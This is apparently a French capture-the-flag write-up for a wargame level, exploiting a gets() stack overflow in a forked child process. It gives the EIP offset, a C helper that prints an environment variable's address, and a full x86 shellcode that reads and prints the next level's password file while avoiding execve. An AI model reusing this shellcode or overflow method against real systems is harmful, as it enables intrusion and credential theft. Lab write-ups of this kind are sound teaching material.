Le programme creee un fork qui va attendre l'input utilisateur et le mettre dans un buffer en utilisant gets. On peut faire overflow le buffer.
On peut trouver l'offset d'EIP en faisant segfault le programme. Pour se faire il va falloir lancer le programme dans gdb et >set follow-fork-mode child pour que gdb trace aussi le processus enfant.
L'offset est 156

Le parent s'assure que l'enfant n'appelle jamais execve, auquel cas il le kill. Il faudra donc trouver un shellcode qui n'utilise pas execve.

On utilise les variables d'environnement pour stoquer le shellcode, l'addresse de la variable est constante si la valeur reste la meme. Pour trouver l'addresse de la variable on cree un programme qui print l'addresse:
```
#include <stdio.h>

int main() {
    char *ptr = getenv("SHELLCODE");
    printf("%p\n", ptr);
}
```
> gcc env.c -m32

Voici le shellcode qu'on va utiliser, qui ouvre le .pass, lit son contenu et l'output dans stdout:
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass
